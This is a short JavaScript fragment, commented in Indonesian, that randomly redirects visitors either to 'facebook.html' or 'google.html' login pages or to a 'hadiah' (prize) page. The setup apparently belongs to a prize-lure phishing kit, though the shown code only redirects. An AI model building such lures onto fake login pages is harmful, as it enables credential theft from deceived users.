  function redirectRandomPage(provider) {
    // Tentukan tingkat hadiah untuk setiap link
    const facebookLoginRate = 40; // Persentase kemungkinan munculnya link login Facebook
    const facebookHadiahRate = 50; // Persentase kemungkinan munculnya link hadiah Facebook
    const googleLoginRate = 40; // Persentase kemungkinan munculnya link login Google
    const googleHadiahRate = 50; // Persentase kemungkinan munculnya link hadiah Google

    // Hitung total tingkat hadiah untuk setiap penyedia
    const totalFacebookRate = facebookLoginRate + facebookHadiahRate;
    const totalGoogleRate = googleLoginRate + googleHadiahRate;

    // Generate bilangan acak antara 1 dan total tingkat hadiah untuk setiap penyedia
    const randomFacebook = Math.floor(Math.random() * totalFacebookRate) + 1;
    const randomGoogle = Math.floor(Math.random() * totalGoogleRate) + 1;

    // Tentukan halaman yang akan ditampilkan berdasarkan bilangan acak
    let selectedPage;
    if (provider === 'facebook') {
      if (randomFacebook <= facebookLoginRate) {
        selectedPage = 'facebook.html';
      } else {
        selectedPage = 'hadiah.html';
      }
    } else if (provider === 'google') {
      if (randomGoogle <= googleLoginRate) {
        selectedPage = 'google.html';
      } else {
        selectedPage = 'hadiah.html';
      }
    }

    // Arahkan pengguna ke halaman yang dipilih
    window.location.href = 'Halaman/' + selectedPage;
  }
</script>
